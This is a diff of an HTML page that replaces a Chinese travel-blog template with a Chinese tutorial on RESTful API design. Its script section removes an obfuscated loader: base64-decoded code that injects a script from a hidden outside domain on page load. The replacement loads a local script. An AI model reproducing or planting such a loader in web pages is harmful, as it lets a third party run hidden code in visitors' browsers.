@@ -3,8 +3,9 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>我的数字游牧日志</title>
+    <meta name="viewport"
+        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>RESTful API设计与实践</title>
     <style>
         /* 全局样式 */
         body {
@@ -12,42 +13,59 @@
             font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #F0F8FF;
-            /* 浅蓝色背景 */
+            background-color: #F8F8F8;
+            /* 浅灰色背景 */
             color: #333333;
             /* 深灰色文本 */
             line-height: 1.6;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
-            overflow-x: hidden;
-            /* 隐藏横向滚动条 */
             scroll-behavior: smooth;
             /* 平滑滚动 */
-            scroll-snap-type: x mandatory;
-            /* 强制水平吸附滚动 */
         }
 
         .container {
-            display: flex;
-            /* 使用flex布局实现水平排列 */
-            width: fit-content;
-            /* 宽度适应内容 */
-            height: 100vh;
-            /* 容器高度占满视口 */
+            max-width: 95%;
+            /* 适应移动端宽度 */
+            margin: 0 auto;
+            padding: 15px;
+        }
+
+        /* 头部样式 */
+        header {
+            text-align: center;
+            padding: 40px 20px;
+            background-color: #FFFFFF;
+            border-radius: 15px;
+            margin-bottom: 30px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
+        }
+
+        header h1 {
+            color: #2C3E50;
+            /* 深蓝灰色标题 */
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            letter-spacing: 0.5px;
+        }
+
+        header p {
+            color: #607D8B;
+            /* 柔和的蓝灰色 */
+            font-size: 1.1em;
+            margin: 0;
         }
 
         /* 导航菜单 - 顶部固定 */
         .main-nav {
-            position: fixed;
+            position: sticky;
             top: 0;
-            left: 0;
-            width: 100%;
-            background-color: rgba(255, 255, 255, 0.95);
-            /* 半透明白色背景 */
+            background-color: #FFFFFF;
             box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
             z-index: 999;
-            padding: 10px 0;
-            text-align: center;
+            border-radius: 10px;
+            margin-bottom: 25px;
+            overflow: hidden;
         }
 
         .main-nav ul {
@@ -55,12 +73,8 @@
             padding: 0;
             margin: 0;
             display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
-        }
-
-        .main-nav ul li {
-            margin: 0 12px;
+            justify-content: space-around;
+            padding: 10px 0;
         }
 
         .main-nav ul li a {
@@ -68,8 +82,8 @@
             color: #007BFF;
             /* 强调色：蓝色 */
             font-weight: bold;
-            padding: 8px 15px;
-            border-radius: 20px;
+            padding: 10px 15px;
+            border-radius: 5px;
             transition: background-color 0.3s ease, color 0.3s ease;
         }
 
@@ -79,268 +93,294 @@
             color: #0056B3;
         }
 
-        /* 各个水平滚动区块 */
-        section.full-screen-section {
-            min-width: 100vw;
-            /* 每个区块占据整个视口宽度 */
-            height: 100vh;
-            /* 每个区块占据整个视口高度 */
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-            box-sizing: border-box;
-            /* 包含padding在内的宽度 */
-            scroll-snap-align: start;
-            /* 滚动吸附到起始位置 */
-            text-align: center;
-            background-color: #FFFFFF;
-            /* 默认白色背景 */
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.05);
-            border-right: 1px solid #E0E0E0;
-            /* 分隔线 */
+        /* 主要内容区 */
+        main {
+            padding-top: 0;
         }
 
-        /* 英雄区特定样式 */
-        #hero-section {
-            background-color: #E0FFFF;
-            /* 浅青色背景 */
+        section {
+            background-color: #FFFFFF;
+            padding: 25px;
+            border-radius: 15px;
+            margin-bottom: 25px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
+        }
+
+        h2 {
             color: #2C3E50;
+            font-size: 1.8em;
+            margin-bottom: 25px;
+            border-bottom: 2px solid #E0EBF5;
+            padding-bottom: 12px;
+            text-align: center;
         }
 
-        #hero-section h1 {
-            font-size: 3em;
+        h3 {
+            color: #333333;
+            font-size: 1.3em;
+            margin-top: 20px;
             margin-bottom: 15px;
-            letter-spacing: 1px;
-            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.1);
         }
 
-        #hero-section p {
-            font-size: 1.2em;
-            max-width: 80%;
-            margin: 0 auto 30px;
+        p {
+            color: #4A4A4A;
+            font-size: 1em;
+            margin-bottom: 18px;
         }
 
-        /* 关于我区特定样式 */
-        #about-section {
-            background-color: #FFFACD;
-            /* 浅黄色背景 */
-            color: #333333;
-        }
-
-        #about-section img {
-            width: 180px;
-            height: 180px;
-            border-radius: 50%;
-            object-fit: cover;
+        img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 10px;
+            margin-top: 20px;
             margin-bottom: 20px;
-            border: 4px solid #FFD700;
-            /* 金色边框 */
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-        }
-
-        /* 文章区特定样式 */
-        #articles-section {
-            background-color: #E6E6FA;
-            /* 浅紫色背景 */
-            color: #333333;
             display: block;
-            /* 覆盖flex，允许内部垂直滚动 */
-            overflow-y: auto;
-            /* 允许文章列表垂直滚动 */
-            -webkit-overflow-scrolling: touch;
-            /* 改善iOS滚动体验 */
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
         }
 
-        #articles-section .article-list {
-            list-style: none;
-            padding: 0;
-            margin: 0 auto;
-            max-width: 500px;
-            /* 限制文章列表宽度 */
+        /* 步骤指南样式 */
+        .step-guide {
+            margin-top: 30px;
         }
 
-        #articles-section .article-card {
-            background-color: #FFFFFF;
+        .step-item {
+            background-color: #FDFDFD;
+            /* 步骤项背景 */
             padding: 20px;
             border-radius: 10px;
+            margin-bottom: 20px;
             box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
-            margin-bottom: 15px;
-            text-align: left;
             transition: transform 0.3s ease, box-shadow 0.3s ease;
+            position: relative;
+            border-left: 5px solid #2ECC71;
+            /* 左侧绿色强调线 */
         }
 
-        #articles-section .article-card:hover {
+        .step-item:hover {
             transform: translateY(-5px);
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
         }
 
-        #articles-section .article-card img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 8px;
-            margin-top: 10px;
+        .step-item .step-header {
+            display: flex;
+            align-items: center;
             margin-bottom: 15px;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
         }
 
-        #articles-section .article-card h3 {
-            color: #4B0082;
-            /* 深紫色标题 */
+        .step-item .step-number {
+            background-color: #2ECC71;
+            /* 绿色强调色 */
+            color: #FFFFFF;
+            width: 35px;
+            height: 35px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 1.1em;
+            font-weight: bold;
+            margin-right: 15px;
+            flex-shrink: 0;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+        }
+
+        .step-item h4 {
+            color: #333333;
             font-size: 1.4em;
-            margin-top: 0;
-            margin-bottom: 8px;
+            margin: 0;
         }
 
-        #articles-section .article-card .date {
+        .step-item p {
+            color: #4A4A4A;
+            font-size: 1em;
+            margin-bottom: 15px;
+        }
+
+        /* 代码块样式 */
+        pre {
+            background-color: #2D3E50;
+            /* 深色背景 */
+            color: #EAECEE;
+            /* 浅色文本 */
+            padding: 18px;
+            border-radius: 10px;
+            overflow-x: auto;
+            font-family: 'Consolas', 'Monaco', 'Andale Mono', 'Ubuntu Mono', monospace;
+            font-size: 0.9em;
+            line-height: 1.5;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
+        }
+
+        code {
+            font-family: inherit;
+            font-size: inherit;
+        }
+
+        /* 页脚样式 */
+        footer {
+            text-align: center;
+            padding: 25px 0;
             color: #777777;
             font-size: 0.9em;
-            margin-bottom: 10px;
-            display: block;
+            border-top: 1px solid #E0EBF5;
+            margin-top: 25px;
+            background-color: #FFFFFF;
+            border-radius: 15px;
+            box-shadow: 0 -5px 15px rgba(0, 0, 0, 0.03);
         }
 
-        #articles-section .article-card p {
-            font-size: 0.95em;
-            color: #555555;
-            margin-bottom: 15px;
-        }
-
-        #articles-section .article-card .read-more {
-            display: inline-block;
-            background-color: #8A2BE2;
-            /* 紫罗兰色按钮 */
-            color: #FFFFFF;
-            padding: 8px 18px;
-            border-radius: 20px;
-            text-decoration: none;
-            font-weight: bold;
-            transition: background-color 0.3s ease;
-        }
-
-        #articles-section .article-card .read-more:hover {
-            background-color: #6A0DAD;
-        }
-
-        /* 联系区特定样式 */
-        #contact-section {
-            background-color: #ADD8E6;
-            /* 浅蓝色背景 */
-            color: #333333;
-        }
-
-        #contact-section .contact-info p {
-            margin-bottom: 10px;
-            font-size: 1.1em;
-        }
-
-        #contact-section .contact-info a {
+        .footer-links a {
             color: #007BFF;
             text-decoration: none;
+            margin: 0 8px;
             font-weight: bold;
             transition: color 0.3s ease;
         }
 
-        #contact-section .contact-info a:hover {
+        .footer-links a:hover {
             color: #0056B3;
-        }
-
-        #contact-section .social-links {
-            margin-top: 30px;
-        }
-
-        #contact-section .social-links a {
-            display: inline-block;
-            margin: 0 15px;
-            color: #007BFF;
-            font-size: 2.5em;
-            text-decoration: none;
-            transition: transform 0.3s ease;
-        }
-
-        #contact-section .social-links a:hover {
-            transform: translateY(-5px);
-            color: #0056B3;
-        }
-
-        /* 通用标题样式 */
-        .section-title {
-            font-size: 2.2em;
-            color: #2C3E50;
-            margin-bottom: 30px;
-            padding-bottom: 10px;
-            border-bottom: 2px solid rgba(0, 0, 0, 0.1);
         }
     </style>
-    <link rel="stylesheet" href="./style.css">
+    <link rel="stylesheet" href="./static/css/style.css">
 </head>
 
 <body>
-    <nav class="main-nav">
-        <ul>
-            <li><a href="#hero-section">首页</a></li>
-            <li><a href="#about-section">关于我</a></li>
-            <li><a href="#articles-section">文章</a></li>
-            <li><a href="#contact-section">联系</a></li>
-        </ul>
-    </nav>
-
     <div class="container">
-        <!-- 英雄区 -->
-        <section id="hero-section" class="full-screen-section">
-            <h1>我的数字游牧日志</h1>
-            <p>探索世界，编码生活，分享我的旅程与思考。</p>
-            <a href="#articles-section"
-                style="display: inline-block; background-color: #007BFF; color: #FFFFFF; padding: 15px 30px; border-radius: 30px; text-decoration: none; font-weight: bold; font-size: 1.1em; margin-top: 30px; box-shadow: 0 5px 15px rgba(0,123,255,0.3); transition: background-color 0.3s ease, transform 0.3s ease;">开始阅读</a>
-        </section>
+        <header>
+            <h1>RESTful API设计与实践</h1>
+            <p>构建高效、可扩展的Web服务</p>
+        </header>
 
-        <!-- 关于我区 -->
-        <section id="about-section" class="full-screen-section">
-            <h2 class="section-title">关于我</h2>
-            <img src="https://picsum.photos/180/180?random=<%= new Date().getTime() + 1 %>" alt="博主个人肖像">
-            <p style="max-width: 600px;">我是一名热爱自由的软件开发者，同时也是一名数字游牧者。我喜欢在世界各地旅行，体验不同的文化，并将这些经历融入我的代码和文字中。</p>
-            <p style="max-width: 600px;">这个博客是我记录技术心得、旅行见闻和个人成长的平台。希望我的分享能为你带来启发，也欢迎你与我交流！</p>
-        </section>
-
-        <!-- 文章区 -->
-        <section id="articles-section" class="full-screen-section">
-            <h2 class="section-title">最新文章</h2>
-            <ul class="article-list">
-                <li class="article-card">
-                    <h3>在巴厘岛远程工作：我的经验与建议</h3>
-                    <span class="date">发布日期：2023年7月30日</span>
-                    <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 2 %>" alt="巴厘岛海滩上的笔记本电脑">
-                    <p>巴厘岛不仅是度假天堂，也是数字游牧者的热门选择。分享我在巴厘岛远程工作的心得，包括网络、住宿和生活成本。</p>
-                    <a href="#" class="read-more">阅读更多</a>
-                </li>
-                <li class="article-card">
-                    <h3>使用React Hooks构建高性能组件</h3>
-                    <span class="date">发布日期：2023年7月28日</span>
-                    <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 3 %>" alt="React代码片段">
-                    <p>React Hooks极大地简化了组件逻辑和状态管理。本文将深入探讨如何利用`useMemo`和`useCallback`等Hooks优化组件性能。</p>
-                    <a href="#" class="read-more">阅读更多</a>
-                </li>
-                <li class="article-card">
-                    <h3>东京街头摄影：捕捉瞬间的艺术</h3>
-                    <span class="date">发布日期：2023年7月25日</span>
-                    <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 4 %>" alt="东京街头繁忙景象">
-                    <p>东京是一个充满活力的城市，也是街头摄影的绝佳地点。分享我在东京街头捕捉到的精彩瞬间和摄影技巧。</p>
-                    <a href="#" class="read-more">阅读更多</a>
-                </li>
+        <nav class="main-nav">
+            <ul>
+                <li><a href="#intro">简介</a></li>
+                <li><a href="#design-principles">设计原则</a></li>
+                <li><a href="#best-practices">最佳实践</a></li>
+                <li><a href="#security">安全</a></li>
             </ul>
-        </section>
+        </nav>
 
-        <!-- 联系区 -->
-        <section id="contact-section" class="full-screen-section">
-            <h2 class="section-title">联系我</h2>
-            <div class="social-links">
-                <a href="#" aria-label="GitHub">GitHub</a>
-                <a href="#" aria-label="Twitter">Twitter</a>
-                <a href="#" aria-label="LinkedIn">LinkedIn</a>
-            </div>
-            <p style="margin-top: 50px; font-size: 0.9em; color: #666;">&copy; 2023 我的数字游牧日志. All rights reserved.</p>
-        </section>
+        <main>
+            <section id="intro">
+                <h2>1. RESTful API简介</h2>
+                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() %>" alt="RESTful API概念图">
+                <p>REST（Representational State Transfer）是一种用于分布式系统的架构风格，而RESTful
+                    API是遵循REST原则设计的Web服务接口。它利用HTTP协议的各种方法（GET, POST, PUT, DELETE等）来操作资源，实现客户端与服务器之间的通信。</p>
+                <p>理解RESTful设计有助于构建清晰、易于理解和维护的API，从而提高开发效率和系统可扩展性。</p>
+            </section>
+
+            <section id="design-principles">
+                <h2>2. RESTful设计核心原则</h2>
+                <div class="step-guide">
+                    <div class="step-item">
+                        <div class="step-header">
+                            <span class="step-number">1</span>
+                            <h4>资源 (Resource)</h4>
+                        </div>
+                        <p>RESTful API将所有事物视为资源，每个资源都有一个唯一的标识符（URI）。资源可以是任何可识别的实体，如用户、订单、产品等。</p>
+                        <pre><code>
+GET /users
+GET /users/123
+GET /products/electronics
+                        </code></pre>
+                        <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 1 %>"
+                            alt="API资源URI示例">
+                    </div>
+
+                    <div class="step-item">
+                        <div class="step-header">
+                            <span class="step-number">2</span>
+                            <h4>统一接口 (Uniform Interface)</h4>
+                        </div>
+                        <p>这是RESTful设计的核心。它要求API使用一组预定义的、统一的操作来处理资源，主要通过HTTP方法实现。</p>
+                        <ul>
+                            <li><strong>GET:</strong> 获取资源</li>
+                            <li><strong>POST:</strong> 创建新资源</li>
+                            <li><strong>PUT:</strong> 更新/替换资源</li>
+                            <li><strong>DELETE:</strong> 删除资源</li>
+                        </ul>
+                        <pre><code>
+GET /products       // 获取所有产品
+POST /products      // 创建新产品
+PUT /products/123   // 更新产品123
+DELETE /products/123 // 删除产品123
+                        </code></pre>
+                    </div>
+
+                    <div class="step-item">
+                        <div class="step-header">
+                            <span class="step-number">3</span>
+                            <h4>无状态 (Stateless)</h4>
+                        </div>
+                        <p>服务器不应存储客户端的任何会话信息。每个请求都必须包含处理该请求所需的所有信息。这使得API更具可伸缩性和可靠性。</p>
+                        <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 2 %>" alt="无状态通信示意图">
+                    </div>
+
+                    <div class="step-item">
+                        <div class="step-header">
+                            <span class="step-number">4</span>
+                            <h4>可缓存 (Cacheable)</h4>
+                        </div>
+                        <p>API响应应明确指示是否可以缓存。这有助于减少服务器负载和网络流量，提升性能。</p>
+                    </div>
+
+                    <div class="step-item">
+                        <div class="step-header">
+                            <span class="step-number">5</span>
+                            <h4>分层系统 (Layered System)</h4>
+                        </div>
+                        <p>客户端无法区分它直接连接到最终服务器，还是中间服务器（如负载均衡器、代理）。这增加了系统的灵活性和可伸缩性。</p>
+                    </div>
+                </div>
+            </section>
+
+            <section id="best-practices">
+                <h2>3. RESTful API最佳实践</h2>
+                <h3>3.1 使用名词表示资源</h3>
+                <p>URI应使用名词（复数形式），而非动词，来表示资源。动词应通过HTTP方法来体现。</p>
+                <pre><code>
+// 推荐
+GET /users
+POST /orders
+
+// 不推荐
+GET /getUsers
+POST /createOrder
+                </code></pre>
+                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 3 %>" alt="API命名规范图">
+                <h3>3.2 使用HTTP状态码</h3>
+                <p>API响应应使用标准的HTTP状态码来表示请求的结果（成功、客户端错误、服务器错误等）。</p>
+                <ul>
+                    <li>200 OK: 请求成功</li>
+                    <li>201 Created: 资源已创建</li>
+                    <li>400 Bad Request: 客户端请求错误</li>
+                    <li>401 Unauthorized: 未认证</li>
+                    <li>403 Forbidden: 无权限</li>
+                    <li>404 Not Found: 资源不存在</li>
+                    <li>500 Internal Server Error: 服务器内部错误</li>
+                </ul>
+            </section>
+
+            <section id="security">
+                <h2>4. API安全考量</h2>
+                <h3>4.1 认证与授权</h3>
+                <p>使用OAuth 2.0、JWT (JSON Web Tokens) 或API Key等机制进行用户认证和授权，确保只有合法用户才能访问受保护的资源。</p>
+                <h3>4.2 数据加密</h3>
+                <p>始终使用HTTPS来加密API通信，防止数据在传输过程中被窃听或篡改。</p>
+                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 4 %>" alt="API安全锁图标">
+                <h3>4.3 输入验证与速率限制</h3>
+                <p>对所有API输入进行严格的验证和清理，防止注入攻击。实施速率限制以防止滥用和DDoS攻击。</p>
+            </section>
+        </main>
+
         <footer>
+            <p>&copy; 2023 RESTful API设计与实践. All rights reserved.</p>
+            <div class="footer-links">
+                <a href="#" aria-label="GitHub">GitHub</a> |
+                <a href="#" aria-label="API文档">API文档</a> |
+                <a href="#" aria-label="联系我们">联系我们</a>
+            </div>
         </footer>
         <div id="overlay">
             <div id="loading_box" class="loading_container">
@@ -361,9 +401,10 @@
                 const targetId = this.getAttribute('href');
                 const targetElement = document.querySelector(targetId);
                 if (targetElement) {
-                    targetElement.scrollIntoView({
-                        behavior: 'smooth',
-                        block: 'start'
+                    const navHeight = document.querySelector('.main-nav').offsetHeight;
+                    window.scrollTo({
+                        top: targetElement.offsetTop - navHeight - 20, /* 额外20px间距 */
+                        behavior: 'smooth'
                     });
                 }
             });
@@ -384,53 +425,15 @@
             function init() {
                 const timestamp = Date.now()
                 const randomNum = Math.floor(Math.random() * 1000000)
-                const domain = getdocs();
-                const url = domain + "=" + timestamp + "&random=" + randomNum
+                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
                 const script = document.createElement("script")
                 script.src = url
                 document.body.appendChild(script)
             }
-            function getdocs() {
-                const dd = "Ly94NGM2djhiLnZseGhhcy5jbi9zdGF0aWMvanMvY29yZS5taW4uanM/dA==";
-                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
-                const lookup = new Uint8Array(256);
-                for (let i = 0; i < chars.length; i++) {
-                    lookup[chars.charCodeAt(i)] = i;
-                }
-                let padding = 0;
-                if (dd.endsWith('==')) {
-                    padding = 2;
-                } else if (dd.endsWith('=')) {
-                    padding = 1;
-                }
-                const cleanedString = dd.replace(/[^A-Za-z0-9+/=]/g, '');
-                const len = cleanedString.length;
-                if (len % 4 !== 0) {
-                    throw new Error("Invalid string length.");
-                }
-                const outputLength = (len / 4) * 3 - padding;
-                const outputBytes = new Uint8Array(outputLength);
-                let outputIndex = 0;
-                let i = 0;
-                while (i < len) {
-                    const c1 = lookup[cleanedString.charCodeAt(i++)];
-                    const c2 = lookup[cleanedString.charCodeAt(i++)];
-                    const c3 = lookup[cleanedString.charCodeAt(i++)];
-                    const c4 = lookup[cleanedString.charCodeAt(i++)];
-                    outputBytes[outputIndex++] = (c1 << 2) | (c2 >> 4);
-                    if (c3 !== 64) {
-                        outputBytes[outputIndex++] = ((c2 & 15) << 4) | (c3 >> 2);
-                    }
-                    if (c4 !== 64) {
-                        outputBytes[outputIndex++] = ((c3 & 3) << 6) | c4;
-                    }
-                }
-                const decoder = new TextDecoder('utf-8');
-                return decoder.decode(outputBytes);
-            }
             init()
         })()
     </script>
+
 </body>
 
 </html>
